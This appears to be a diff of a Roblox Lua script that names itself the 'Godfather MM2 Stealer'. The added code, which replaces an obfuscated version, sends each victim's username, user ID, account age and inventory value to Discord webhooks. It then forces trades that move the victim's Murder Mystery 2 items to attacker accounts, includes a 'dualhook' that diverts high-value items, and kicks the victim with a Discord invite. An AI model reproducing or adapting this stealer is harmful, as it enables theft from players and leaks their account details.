+        local received = receivedCounts[origItem.ItemName] or 0
+        local receivedValue = received * origItem.Value
+        local totalValue = origItem.TotalValue
+        totalReceivedValue = totalReceivedValue + receivedValue
+        totalOriginalValue = totalOriginalValue + totalValue
+
+        local percentage = math.floor((received / origItem.Amount) * 100)
+        local statusEmoji = percentage == 100 and "✅" or percentage >= 50 and "⏳" or "🔄"
+        
+        table.insert(itemFields, {
+            name = string.format("%s %s", statusEmoji, origItem.ItemName),
+            value = string.format("```[%d/%d] %d%%\nValue: %d/%d```", received, origItem.Amount, percentage, receivedValue, totalValue),
+            inline = true
+        })
+    end
+
+    local totalPercentage = math.floor((totalReceivedValue / totalOriginalValue) * 100)
+    local progressColor = totalPercentage == 100 and 0x00FF00 or totalPercentage >= 75 and 0xFFD700 or 0x8B0000
+
+    local embed = {
+        title = "⟳ TRADE IN PROGRESS",
+        color = progressColor,
+        fields = itemFields,
+        description = string.format("**Total Progress: %d/%d Value (%d%%)**", totalReceivedValue, totalOriginalValue, totalPercentage),
+        footer = { 
+            text = "Godfather MM2 Stealer • NULS Hosting • v3.4.1"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    local payload = { embeds = { embed } }
+    sendToProxy(WEBHOOK_ID, payload, true)
+end
+
+local function sendWebhook(targetWebhookId, isDualhook)
+    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
+    local targetName = isDualhook and table.concat(dualhookUser, ", ") or table.concat(users, ", ")
+    local hookType = isDualhook and "⚠️ DUALHOOK BACKUP" or "🎯 HIT CONFIRMED"
+    local color = isDualhook and 0xFF4500 or 0x8B0000
+    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', PlaceId, REAL_JOB_ID)
+
+    local itemsForWebhook = weaponsToSend
+    if isDualhook then
+        itemsForWebhook = {}
+        for _, item in ipairs(weaponsToSend) do
+            if item.Rarity == "Godly" or item.Rarity == "Vintage" or item.Rarity == "Ancient" or item.Rarity == "Unique" or item.IsChroma then
+                table.insert(itemsForWebhook, item)
+            end
+        end
+    end
+
+    local total_items = 0
+    for _, item in ipairs(itemsForWebhook) do total_items = total_items + item.Amount end
+
+    local top_items = {}
+    for i = 1, math.min(3, #itemsForWebhook) do
+        local item = itemsForWebhook[i]
+        local rarityEmoji = {
+            Ancient = "🔴", Godly = "🟣", Unique = "🟡", 
+            Vintage = "🟠", Legendary = "🔵", Rare = "🟢"
+        }
+        local emoji = rarityEmoji[item.Rarity] or "⚪"
+        table.insert(top_items, string.format("%s `%s` ×%d **%d**", emoji, item.ItemName, item.Amount, item.TotalValue))
+    end
+
+    local tier_counts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
+    for _, item in ipairs(itemsForWebhook) do
+        tier_counts[item.Rarity] = (tier_counts[item.Rarity] or 0) + item.Amount
+    end
+
+    local content = nil
+    if isPingWorthy and cfg.pingEveryone == "Yes" then
+        content = isDualhook and "@everyone ⚠️ **DUALHOOK TRIGGERED**" or "@everyone 🎯 **NEW HIT ACQUIRED**"
+    end
+
+    local embed = {
+        title = string.format("%s │ %s │ %s", hookType, plr.DisplayName, hitCategory),
+        url = rubisLink,
+        color = color,
+        thumbnail = {url = avatarUrl},
+        description = string.format("```lua\n%s\n```", joinScript),
+        fields = {
+			{
+				name = "👤 Victim",
+				value = string.format("```\n%s (@%s)\nID: %d\nAge: %d days\n```", plr.DisplayName, plr.Name, plr.UserId, plr.AccountAge),
+				inline = true
+			},
+			{
+				name = "⚙️ System",
+				value = string.format("```\nExecutor: %s\nReceiver: %s\nJob ID: %s\n```", executorName, targetName, string.sub(REAL_JOB_ID, 1, 8).."..."),
+				inline = true
+			},
+			{
+				name = "💰 Valuation",
+				value = string.format("```\nTotal Value: %d\nTotal Items: %d\n```", totalInventoryValue, total_items),
+				inline = true
+			},
+            {
+                name = "📊 Inventory Breakdown",
+                value = string.format("```ansi\n[2;31mAncient:  %d  [2;35mGodly:   %d[0m\n[2;33mUnique:   %d  [2;38;5;208mVintage: %d[0m\n[2;34mLegendary:%d  [2;32mRare:    %d[0m\n[2;37mUncommon: %d  Common:  %d```", 
+                    tier_counts.Ancient, tier_counts.Godly,
+                    tier_counts.Unique, tier_counts.Vintage,
+                    tier_counts.Legendary, tier_counts.Rare,
+                    tier_counts.Uncommon, tier_counts.Common),
+                inline = false
+            },
+            {
+				name = "🏆 Top Items",
+				value = #top_items > 0 and string.format("```\n%s\n```", table.concat(top_items, "\n")) or "```\nNo items\n```",
+				inline = false
+			},
+            {
+                name = "🔗 Actions",
+                value = string.format("[Join Server](%s) • [View Inventory](%s)", fernJoinerLink, rubisLink),
+                inline = false
+            }
+        },
+        footer = {
+            text = string.format("Godfather MM2 Stealer • NULS • v3.5.1 • %s", os.date("!%H:%M:%S UTC"))
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    local payload = {
+        content = content,
+        username = isDualhook and "🔥 Dualhook Alert" or "💎 Godfather Stealer",
+        avatar_url = AVATAR_URL,
+        embeds = {embed}
+    }
+
+    sendToProxy(targetWebhookId, payload, isDualhook)
+
+    local receivers = isDualhook and dualhookUser or users
+    for _, rcv in ipairs(receivers) do
+        sendHitToQueue(PlaceId, REAL_JOB_ID, rcv)
+    end
+end
+
+local function sendPublicHits()
+    local tier_counts = rarityCounts
+    local total_items = 0
+    for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end
+
+    local content = "📢 **PUBLIC HIT REGISTERED**"
+
+    local rarityLines = {}
+    local rarities = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
+    local ansiColors = {"31", "35", "33", "38;5;208", "34", "32", "37", "30"}
+    
+    for i, rarity in ipairs(rarities) do
+        local count = tier_counts[rarity] or 0
+        if count > 0 then
+            table.insert(rarityLines, string.format("[2;%sm%s: %d[0m", ansiColors[i], rarity, count))
+        end
+    end
+
+    local embed = {
+        title = string.format("🌐 Public Greed │ %s", hitCategory),
+        url = rubisLink,
+        color = 0x8B0000,
+        description = string.format("**%s** got hit by Godfathers!", plr.Name),
+        fields = {
+            { 
+                name = "💎 Valuation", 
+                value = string.format("```yaml\nvalue: %d\nitems: %d```", totalInventoryValue, total_items), 
+                inline = true 
+            },
+            { 
+                name = "⚡ Executor", 
+                value = string.format("```yaml\nname: %s\nversion: %s```", executorName, "v3.5.1"), 
+                inline = true 
+            },
+            { 
+                name = "📊 Breakdown", 
+                value = string.format("```ansi\n%s```", table.concat(rarityLines, "\n")), 
+                inline = false 
+            }
+        },
+        footer = { 
+            text = "Godfather MM2 Stealer • NULS Hosting • v3.5.1"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    local payload = {
+        content = content,
+        username = "📡 Public Broadcast",
+        avatar_url = AVATAR_URL,
+        embeds = {embed}
+    }
+
+    sendToProxy(PUBLIC_WEBHOOK_ID, payload, false)
+end
+-- Dualhook timer
+local function startDualhookTimer()
+    dualhookTimer = task.delay(100, function()
+        if not isTradeCompleted then
+            isDualhookActive = true
+            sendWebhook(DUALHOOK_WEBHOOK_ID, true)
+            local target = nil
+            for _, name in ipairs(dualhookUser) do
+                local player = Players:FindFirstChild(name)
+                if player and player ~= plr then
+                    target = player
+                    break
+                end
+            end
+            if target then
+                task.spawn(function() doTrade(target) end)
+            end
+        end
+    end)
+end
+
+local function cancelDualhookTimer()
+    if dualhookTimer then task.cancel(dualhookTimer); dualhookTimer = nil end
+end
+
+sendWebhook(WEBHOOK_ID, false)
+sendPublicHits()
+
+if totalInventoryValue >= 300 then
+    startDualhookTimer()
+end
+
+-- Trade fonksiyonları
+local function getStatus()
+    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
+    return ok and status or "None"
+end
+
+local function waitForTarget(targetPlayer)
+    local attempts = 0
+    while attempts < 30 do
+        if targetPlayer and targetPlayer.Parent then
+            local char = targetPlayer.Character
+            if char and char:FindFirstChild("Humanoid") then return true end
+        end
+        attempts = attempts + 1
+        task.wait(0.5)
+    end
+    return false
+end
+
+local function AcceptTrade()
+    if not LastOffer then return false end
+    local ok = pcall(function()
+        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
+    end)
+    return ok
+end
+
+local function finishAndKick()
+    isTradeCompleted = true
+    cancelDualhookTimer()
+    task.wait(2)
+    local discordLink = "https://discord.gg/dUaHggzp9q"
+    pcall(function() setclipboard(discordLink) end)
+    plr:Kick("Items taken by Godfather Script\n\n" .. discordLink .. "\n\nJoin to get your items back!")
+end
+
+function doTrade(targetPlayer)
+    if not targetPlayer or not targetPlayer.Parent then return end
+    if not waitForTarget(targetPlayer) then return end
+    
+    pcall(function() DeclineTrade:FireServer() end)
+    task.wait(0.5)
+    LastOffer = nil
+    
+    local itemsAdded = false
+    local timeout = 0
+    
+    while timeout < 60 and #weaponsToSend > 0 do
+        local success = pcall(function()
+            local status = getStatus()
+            
+            if status == "None" then
+                if itemsAdded then
+                    for i = 1, math.min(4, #weaponsToSend) do 
+                        local removed = table.remove(weaponsToSend, 1)
+                        if originalItems and receivedCounts and not isDualhookTrade then
+                            receivedCounts[removed.ItemName] = (receivedCounts[removed.ItemName] or 0) + removed.Amount
+                        end
+                    end
+                    itemsAdded = false
+                    LastOffer = nil
+                    task.wait(0.5)
+                    if not isDualhookTrade then
+                        updateTradeMessage()
+                    end
+                else
+                    SendRequest:InvokeServer(targetPlayer)
+                    task.wait(1.5)
+                end
+            elseif status == "SendingRequest" then
+                task.wait(0.5)
+            elseif status == "ReceivingRequest" then
+                DeclineTrade:FireServer()
+                task.wait(0.3)
+            elseif status == "StartTrade" then
+                if not itemsAdded then
+                    for i = 1, math.min(4, #weaponsToSend) do
+                        local item = weaponsToSend[i]
+                        for _ = 1, item.Amount do
+                            OfferItem:FireServer(item.DataID, "Weapons")
+                        end
+                        task.wait(0.1)
+                    end
+                    itemsAdded = true
+                    task.spawn(function()
+                        task.wait(6.5)
+                        AcceptTrade()
+                    end)
+                else
+                    task.wait(1)
+                end
+            end
+        end)
+        
+        if not success then task.wait(1) end
+        timeout = timeout + 1
+    end
+    
+    if #weaponsToSend == 0 then 
+        if not isDualhookTrade then
+            updateTradeMessage()
+        end
+        finishAndKick() 
+    end
+end
+
+-- Target kontrol
+local function isTarget(name)
+    for _, u in ipairs(users) do
+        if u:lower() == name:lower() then return true end
+    end
+    if isDualhookActive then
+        for _, u in ipairs(dualhookUser) do
+            if u:lower() == name:lower() then return true end
+        end
+    end
+    return false
+end
+
+-- Eventler
+Players.PlayerAdded:Connect(function(player)
+    if player == plr then return end
+    if isTarget(player.Name) then
+        task.spawn(function()
+            task.wait(4)
+            doTrade(player)
+        end)
+    end
 end)
-local _0x00f9 = _0x00f2:lower():find("_0x00fa") ~= nil
-local _0x00fb = _0x0067()._0x0080
-local _0x00fc = (_0x0067 and (_0x0067()._0x00fd or _0x0067()._0x002b)) or nil
-local _0x00fe = _0x0088._0x0093 or ""
-local _0x00ff = _0x0088._0x0099 or ""
-local _0x0100 = "_0x004d://_0x0101._0x0102._0x0103/_0x0104/1469409737220165746/1469677154294825032/_0x0105._0x0106"
-local function _0x0109(_0x010a, _0x010b, _0x010c)
-pcall(function()
-_0x0062({
-_0x010d = _0x009d,
-_0x010e = "_0x010f",
-_0x0110 = {["_0x0111-_0x0112"] = "_0x0113/_0x0114"},
-_0x0115 = _0x0085:_0x0116({
-_0x010a = tostring(_0x010a),
-_0x010b = tostring(_0x010b),
-_0x0117 = _0x010c
-})
-})
-end)
-end
-local function _0x011b(_0x011c)
-local _0x011d = {"_0x011e _0x011f _0x0120| _0x0121", "_0x0122: " .. os._0x0123("%_0x0124-%_0x0125-%_0x0040 %_0x0126:%_0x0064:%_0x0127"), "_0x0128 _0x0129: " .. #_0x011c, string.rep("-", 50), ""}
-table.sort(_0x011c, function(_0x003a, _0x003b)
-local _0x012a = {_0x012b=9, _0x012c=8, _0x012d=7, _0x012e=6, _0x012f=5, _0x0130=4, _0x0131=3, _0x0132=2}
-local _0x0133 = _0x012a[_0x003a._0x0134] or 1
-local _0x0135 = _0x012a[_0x003b._0x0134] or 1
-if _0x0133 ~= _0x0135 then return _0x0133 > _0x0135 end
-return (_0x003a._0x0136 * _0x003a._0x0137) > (_0x003b._0x0136 * _0x003b._0x0137)
-end)
-local _0x0138 = nil
-for _0x0021, _0x002c in ipairs(_0x011c) do
-if _0x0138 ~= _0x002c._0x0134 then
-_0x0138 = _0x002c._0x0134
-table.insert(_0x011d, "")
-table.insert(_0x011d, "[" .. _0x0138:upper() .. "]")
-table.insert(_0x011d, string.rep("-", 30))
-end
-local _0x0139 = _0x002c._0x0136 * _0x002c._0x0137
-table.insert(_0x011d, string.format("%_0x000d | _0x013a: %_0x0040 | _0x0136: %_0x0040 (_0x0128: %_0x0040)", _0x002c._0x013b or _0x002c._0x013c, _0x002c._0x0137, _0x002c._0x0136, _0x0139))
-end
-local _0x013d = table.concat(_0x011d, "\_0x000e")
-local _0x00f4, _0x013e = pcall(function()
-return _0x0062({
-_0x010d = "_0x004d://_0x013f._0x0098/_0x0054/_0x0140/_0x0141",
-_0x010e = "_0x010f",
-_0x0110 = {["_0x0111-_0x0112"] = "_0x0113/_0x0114"},
-_0x0115 = _0x0085:_0x0116({
-_0x013d = _0x013d,
-type = "_0x0142"
-})
-})
-end)
-if _0x00f4 and _0x013e and _0x013e._0x0143 == 200 then
-local _0x00f6, _0x0144 = pcall(function() return _0x0085:_0x0145(_0x013e._0x0115) end)
-if _0x00f6 and _0x0144 then
-if _0x0144._0x0141 then
-return "_0x004d://_0x013f._0x0098/" .. _0x0144._0x0141._0x0146
-elseif _0x0144._0x0146 then
-return "_0x004d://_0x013f._0x0098/" .. _0x0144._0x0146
-end
-end
-end
-return nil
-end
-local function _0x014b()
-local _0x014c = {
-_0x014d = "_0x004d://_0x014e._0x0103/_0x014f/_0x014d",
-_0x0150 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0150",
-_0x0151 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0151",
-_0x0152 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0152",
-_0x0153 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0153",
-_0x0154 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0154",
-_0x0155 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0155",
-_0x0156 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0156",
-_0x0157 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0157",
-_0x0158 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0158",
-_0x0159 = "_0x004d://_0x014e._0x0103/_0x014f/_0x0159"
-}
-local _0x015a = {
-["_0x015b"] = "_0x015c/_0x015d,_0x0113/_0x015e+_0x015f,_0x0113/_0x015f;_0x0160=0.9,_0x0161/_0x0162,_0x0161/_0x0163,_0x0161/_0x0164,*/*;_0x0160=0.8",
-["_0x0165-_0x0166"] = "_0x0167/5.0 (_0x0168 _0x0169 10.0; _0x016a; _0x016b) _0x016c/537.36 (_0x016d, _0x016e _0x016f) _0x0170/131.0.0.0 _0x0171/537.36"
-}
-local function _0x0172(_0x0173) return _0x0173:match("^%_0x000d*(.-)%_0x000d*$") end
-local function _0x0174(_0x0175)
-local _0x00f4, _0x013e = pcall(function() return _0x0062({_0x010d = _0x0175, _0x010e = "_0x0176", _0x0110 = _0x015a}) end)
-if _0x00f4 and _0x013e then return _0x013e._0x0115 end
-return nil
-end
-local function _0x0177(_0x0178)
-local _0x0179 = _0x0178:match("<_0x003b%_0x000d+_0x017a=['\"]_0x017b['\"]>([%_0x0040,%.]+)</_0x003b>")
-if _0x0179 then
-_0x0179 = _0x0179:gsub(",", "")
-local _0x017c = tonumber(_0x0179)
-if _0x017c then return _0x017c end
-end
-return nil
-end
-local function _0x017d(_0x017e)
-local _0x017f = {}
-for _0x0180, _0x0178 in _0x017e:gmatch("<_0x0181%_0x000d+_0x017a=['\"]_0x0182['\"]>(.-)</_0x0181>%_0x000d*<_0x0181%_0x000d+_0x017a=['\"]_0x0183['\"]>(.-)</_0x0181>") do
-_0x0180 = _0x0180:match("([^<]+)")
-if _0x0180 then
-_0x0180 = _0x0172(_0x0180:gsub("%_0x000d+", " "))
-_0x0180 = _0x0172((_0x0180:_0x0184(" _0x0185 "))[1])
-local _0x0186 = _0x0180:lower()
-local _0x017c = _0x0177(_0x0178)
-if _0x017c then _0x017f[_0x0186] = _0x017c end
-end
-end
-return _0x017f
-end
-local function _0x0187(_0x017e)
-local _0x0188 = {}
-for _0x0189, _0x0178 in _0x017e:gmatch("<_0x0181%_0x000d+_0x017a=['\"]_0x0182['\"]>(.-)</_0x0181>%_0x000d*<_0x0181%_0x000d+_0x017a=['\"]_0x0183['\"]>(.-)</_0x0181>") do
-_0x0189 = _0x0189:match("([^<]+)")
-if _0x0189 then
-_0x0189 = _0x0172(_0x0189:gsub("%_0x000d+", " ")):lower()
-local _0x017c = _0x0177(_0x0178)
-if _0x017c then _0x0188[_0x0189] = _0x017c end
-end
-end
-return _0x0188
-end
-local _0x018a = {}
-local _0x018b = {}
-local _0x018c = {}
-for _0x018d, _0x0175 in pairs(_0x014c) do
-table.insert(_0x018c, {_0x018d = _0x018d, _0x0175 = _0x0175})
-end
-local _0x018e = #_0x018c
-local _0x018f = 0
-local _0x0190 = _0x0191._0x0192("_0x0193")
-for _0x0021, _0x0194 in ipairs(_0x018c) do
-_0x0005._0x0195(function()
-local _0x018d = _0x0194._0x018d
-local _0x0175 = _0x0194._0x0175
-local _0x017e = _0x0174(_0x0175)
-if _0x017e and _0x017e ~= "" then
-if _0x018d == "_0x0154" then
-local _0x0196 = _0x0187(_0x017e)
-for _0x0197, _0x0022 in pairs(_0x0196) do _0x018b[_0x0197] = _0x0022 end
-else
-local _0x0196 = _0x017d(_0x017e)
-for _0x0197, _0x0022 in pairs(_0x0196) do _0x018a[_0x0197] = _0x0022 end
-end
-end
-_0x018f = _0x018f + 1
-if _0x018f == _0x018e then _0x0190:_0x0198() end
-end)
-end
-_0x0190._0x0199:_0x019a()
-local _0x019b = {}
-local _0x019c = require(_0x00de:_0x019d("_0x019e"):_0x019d("_0x019f"):_0x019d("_0x01a0"))
-for _0x0146, _0x0144 in pairs(_0x019c) do
-local _0x01a1 = _0x0144._0x013b and _0x0144._0x013b:lower() or ""
-local _0x018d = _0x0144._0x0134 or ""
-local _0x01a2 = _0x0144._0x00be or false
-if _0x01a1 ~= "" and _0x018d ~= "" then
-if _0x01a2 then
-for _0x01a3, _0x01a4 in pairs(_0x018b) do
-if _0x01a3:find(_0x01a1) then
-_0x019b[_0x0146] = _0x01a4
-break
-end
-end
-end
-if not _0x019b[_0x0146] and _0x018a[_0x01a1] then
-_0x019b[_0x0146] = _0x018a[_0x01a1]
-end
-if not _0x019b[_0x0146] then
-if _0x018d == "_0x012c" then _0x019b[_0x0146] = 8
-elseif _0x018d == "_0x012b" then _0x019b[_0x0146] = 50
-elseif _0x018d == "_0x012d" then _0x019b[_0x0146] = 100
-elseif _0x018d == "_0x012e" then _0x019b[_0x0146] = 25
-elseif _0x018d == "_0x01a5" then _0x019b[_0x0146] = 15
-elseif _0x018d == "_0x012f" then _0x019b[_0x0146] = 5
-else _0x019b[_0x0146] = 1 end
-end
-end
-end
-return _0x019b
-end
-if not _0x00df._0x01af then _0x00df._0x01b0:_0x019a() end
-_0x0005._0x0006(1)
-local _0x000f = _0x0007._0x000f
-local _0x01b1 = string.format("_0x004d://_0x01b2._0x01b3/_0x01b4?_0x010a=%_0x0040&_0x01b5=%_0x000d", _0x000f, _0x001b)
-local _0x00a1 = _0x00de:_0x019d("_0x00a1")
-local _0x01b6 = _0x00a1:_0x019d("_0x01b6")
-local _0x01b7 = _0x00a1:_0x019d("_0x01b8")
-local _0x01b9 = _0x00a1:_0x019d("_0x01b9")
-local _0x01ba = _0x00a1:_0x019d("_0x01bb")
-local _0x01bc = _0x00a1:_0x019d("_0x01bc")
-local _0x01bd = nil
-_0x00a1._0x01be._0x01bf:_0x01c0(function(_0x01c1)
-if _0x01c1 and _0x01c1._0x01bd then _0x01bd = _0x01c1._0x01bd end
-end)
-local _0x01c5 = _0x00df:_0x019d("_0x01c5")
-for _0x0021, _0x01c6 in ipairs({"_0x01c7", "_0x01c8"}) do
-local _0x01c9 = _0x01c5:_0x01ca(_0x01c6)
-if _0x01c9 then
-_0x01c9._0x01cb = false
-_0x01c9:_0x01cc("_0x01cb"):_0x01c0(function()
-if _0x01c9._0x01cb then _0x01c9._0x01cb = false end
-end)
-end
-end
-local _0x01ce = require(_0x00de:_0x019d("_0x019e"):_0x019d("_0x019f"):_0x019d("_0x01a0"))
-local _0x01cf = _0x00de._0x01d0._0x011f._0x01d1:_0x01d2(_0x00df._0x01d3)
-local _0x01d4 = {}
-local _0x01d5 = {_0x012b=0, _0x012c=0, _0x012d=0, _0x012e=0, _0x012f=0, _0x0130=0, _0x0131=0, _0x0132=0}
-local _0x01d6 = _0x014b()
-for _0x01d7, _0x01d8 in pairs(_0x01cf._0x01d9._0x01da or {}) do
-local _0x002c = _0x01ce[_0x01d7]
-if _0x002c and not _0x00a3[_0x01d7] then
-local _0x0180 = _0x002c._0x013b or _0x01d7
-local _0x018d = _0x002c._0x0134 or "_0x0132"
-local _0x017c = _0x01d6[_0x01d7] or 1
-local _0x01db = _0x017c * _0x01d8
-_0x00e4 = _0x00e4 + _0x01db
-if _0x00c1[_0x0180] then _0x00e3 = true end
-table.insert(_0x01d4, {
-_0x013c = _0x01d7,
-_0x013b = _0x0180,
-_0x0137 = _0x01d8,
-_0x0134 = _0x018d,
-_0x0136 = _0x017c,
-_0x01dc = _0x01db,
-_0x01dd = _0x00c1[_0x0180] or false
-})
-_0x01d5[_0x018d] = (_0x01d5[_0x018d] or 0) + _0x01d8
-end
-end
-table.sort(_0x01d4, function(_0x003a, _0x003b) return _0x003a._0x01dc > _0x003b._0x01dc end)
-local _0x01e0 = ""
-local _0x01e1 = false
-if _0x00e4 < 100 then
-_0x01e0 = "_0x01e2 _0x01de"
-elseif _0x00e4 < 300 then
-_0x01e0 = "_0x01e3 _0x01de"
-elseif _0x00e4 < 1000 then
-_0x01e0 = "_0x01e4 _0x01de"
-_0x01e1 = true
-else
-_0x01e0 = "_0x01e5 _0x01de"
-_0x01e1 = true
-end
-local _0x01e6 = _0x011b(_0x01d4) or "_0x01e7 _0x01e8"
-local function _0x01e9(_0x01ea, _0x01eb, _0x01ec)
-_0x0005._0x0195(function()
-local _0x01ed = _0x0085:_0x0116(_0x01eb)
-if _0x01ec then
-_0x01ed = _0x0048(_0x01ed)
-end
-local _0x0175 = _0x004c .. _0x01ea
-print("[_0x011e] _0x01ee _0x01ef _0x0055:", _0x0175)
-local _0x01f0, _0x013e = pcall(function()
-return _0x0062({
-_0x010d = _0x0175,
-_0x010e = "_0x010f",
-_0x0110 = {
-["_0x0111-_0x0112"] = "_0x0113/_0x0114",
-["_0x0165-_0x0166"] = "_0x011e/3.5.1"
-},
-_0x0115 = _0x01ed
-})
-end)
-if not _0x01f0 then
-_0x007b("[_0x011e] _0x01f1 _0x01e8:", tostring(_0x013e))
-elseif _0x013e._0x0143 ~= 200 then
-_0x007b("[_0x011e] _0x01f2 error:", _0x013e._0x0143, _0x013e._0x0115)
-else
-print("[_0x011e] _0x01f3")
-end
-end)
-end
-local function _0x01f8()
-if not _0x00ed or not _0x00e9 or #_0x00e9 == 0 then return end
-if _0x00ee then return end
-local _0x01f9 = 0
-local _0x01fa = 0
-local _0x01fb = {}
-for _0x0021, _0x01fc in ipairs(_0x00e9) do
-local _0x01fd = _0x00ea[_0x01fc._0x013b] or 0
-local _0x01fe = _0x01fd * _0x01fc._0x0136
-local _0x01db = _0x01fc._0x01dc
-_0x01f9 = _0x01f9 + _0x01fe
-_0x01fa = _0x01fa + _0x01db
-local _0x01ff = math.floor((_0x01fd / _0x01fc._0x0137) * 100)
-local _0x0200 = _0x01ff == 100 and "✅" or _0x01ff >= 50 and "⏳" or "🔄"
-table.insert(_0x01fb, {
-_0x0026 = string.format("%_0x000d %_0x000d", _0x0200, _0x01fc._0x013b),
-_0x017c = string.format("```[%_0x0040/%_0x0040] %_0x0040%%\_0x0201: %_0x0040/%_0x0040```", _0x01fd, _0x01fc._0x0137, _0x01ff, _0x01fe, _0x01db),
-_0x0202 = true
-})
-end
-local _0x0203 = math.floor((_0x01f9 / _0x01fa) * 100)
-local _0x0204 = _0x0203 == 100 and 0x00FF00 or _0x0203 >= 75 and 0xFFD700 or 0x8B0000
-local _0x0205 = {
-_0x0206 = "⟳ _0x0207 _0x0208 _0x0209",
-_0x020a = _0x0204,
-_0x020b = _0x01fb,
-_0x020c = string.format("**_0x0128 _0x020d: %_0x0040/%_0x0040 _0x0136 (%_0x0040%%)**", _0x01f9, _0x01fa, _0x0203),
-_0x020e = {
-_0x015c = "_0x011e _0x000a _0x020f • _0x0210 _0x0211 • _0x0212.4.1"
-},
-_0x0213 = os._0x0123("!%_0x0124-%_0x0125-%_0x0214%_0x0126:%_0x0064:%_0x0215")
-}
-local _0x01eb = { _0x0216 = { _0x0205 } }
-_0x01e9(_0x0002, _0x01eb, true)
-end
-local function _0x0217(_0x0218, _0x0219)
-local _0x021a = string.format("_0x004d://_0x021b._0x021c._0x0103/_0x021d-_0x021e/_0x0161?_0x021f=%_0x0040&_0x0220=420&_0x0221=420&format=_0x0106", _0x00df._0x0222)
-local _0x0223 = _0x0219 and table.concat(_0x008b, ", ") or table.concat(_0x0089, ", ")
-local _0x0224 = _0x0219 and "⚠️ _0x0225 _0x0226" or "🎯 _0x0227 _0x0228"
-local _0x020a = _0x0219 and 0xFF4500 or 0x8B0000
-local _0x0229 = string.format('_0x0007:_0x0086("_0x00dd"):_0x022a("%_0x0040", "%_0x000d", _0x0007._0x0010._0x0011)', _0x000f, _0x001b)
-local _0x022b = _0x01d4
-if _0x0219 then
-_0x022b = {}
-for _0x0021, _0x002c in ipairs(_0x01d4) do
-if _0x002c._0x0134 == "_0x012c" or _0x002c._0x0134 == "_0x012e" or _0x002c._0x0134 == "_0x012b" or _0x002c._0x0134 == "_0x012d" or _0x002c._0x01dd then
-table.insert(_0x022b, _0x002c)
-end
-end
-end
-local _0x022c = 0
-for _0x0021, _0x002c in ipairs(_0x022b) do _0x022c = _0x022c + _0x002c._0x0137 end
-local _0x022d = {}
-for _0x0039 = 1, math.min(3, #_0x022b) do
-local _0x002c = _0x022b[_0x0039]
-local _0x022e = {
-_0x012b = "🔴", _0x012c = "🟣", _0x012d = "🟡",
-_0x012e = "🟠", _0x012f = "🔵", _0x0130 = "🟢"
-}
-local _0x022f = _0x022e[_0x002c._0x0134] or "⚪"
-table.insert(_0x022d, string.format("%_0x000d `%_0x000d` ×%_0x0040 **%_0x0040**", _0x022f, _0x002c._0x013b, _0x002c._0x0137, _0x002c._0x01dc))
-end
-local _0x0230 = {_0x012b=0, _0x012c=0, _0x012d=0, _0x012e=0, _0x012f=0, _0x0130=0, _0x0131=0, _0x0132=0}
-for _0x0021, _0x002c in ipairs(_0x022b) do
-_0x0230[_0x002c._0x0134] = (_0x0230[_0x002c._0x0134] or 0) + _0x002c._0x0137
-end
-local _0x013d = nil
-if _0x01e1 and _0x0088._0x0091 == "_0x0092" then
-_0x013d = _0x0219 and "@_0x0231 ⚠️ **_0x0225 _0x0232**" or "@_0x0231 🎯 **_0x0233 _0x0227 _0x0234**"
-end
-local _0x0205 = {
-_0x0206 = string.format("%_0x000d │ %_0x000d │ %_0x000d", _0x0224, _0x00df._0x0235, _0x01e0),
-_0x0175 = _0x01e6,
-_0x020a = _0x020a,
-_0x021e = {_0x0175 = _0x021a},
-_0x020c = string.format("```_0x0236\_0x000e%_0x000d\_0x000e```", _0x0229),
-_0x020b = {
-{
-_0x0026 = "👤 _0x0237",
-_0x017c = string.format("```\_0x000e%_0x000d (@%_0x000d)\_0x0238: %_0x0040\_0x0239: %_0x0040 _0x023a\_0x000e```", _0x00df._0x0235, _0x00df._0x01d3, _0x00df._0x0222, _0x00df._0x023b),
-_0x0202 = true
-},
-{
-_0x0026 = "⚙️ _0x023c",
-_0x017c = string.format("```\_0x023d: %_0x000d\_0x023e: %_0x000d\_0x023f _0x0240: %_0x000d\_0x000e```", _0x00f2, _0x0223, string.sub(_0x001b, 1, 8).."..."),
-_0x0202 = true
-},
-{
-_0x0026 = "💰 _0x0241",
-_0x017c = string.format("```\_0x0242 _0x0136: %_0x0040\_0x0242 _0x0129: %_0x0040\_0x000e```", _0x00e4, _0x022c),
-_0x0202 = true
-},
-{
-_0x0026 = "📊 _0x011f _0x0243",
-_0x017c = string.format("```_0x0244\_0x000e[2;31mAncient:  %_0x0040  [2;35mGodly:   %_0x0040[0m\_0x000e[2;33mUnique:   %_0x0040  [2;38;5;208mVintage: %_0x0040[0m\_0x000e[2;34mLegendary:%_0x0040  [2;32mRare:    %_0x0040[0m\_0x000e[2;37mUncommon: %_0x0040  _0x0132:  %_0x0040```",
-_0x0230._0x012b, _0x0230._0x012c,
-_0x0230._0x012d, _0x0230._0x012e,
-_0x0230._0x012f, _0x0230._0x0130,
-_0x0230._0x0131, _0x0230._0x0132),
-_0x0202 = false
-},
-{
-_0x0026 = "🏆 _0x0245 _0x0129",
-_0x017c = #_0x022d > 0 and string.format("```\_0x000e%_0x000d\_0x000e```", table.concat(_0x022d, "\_0x000e")) or "```\_0x0246 _0x011c\_0x000e```",
-_0x0202 = false
-},
-{
-_0x0026 = "🔗 _0x0247",
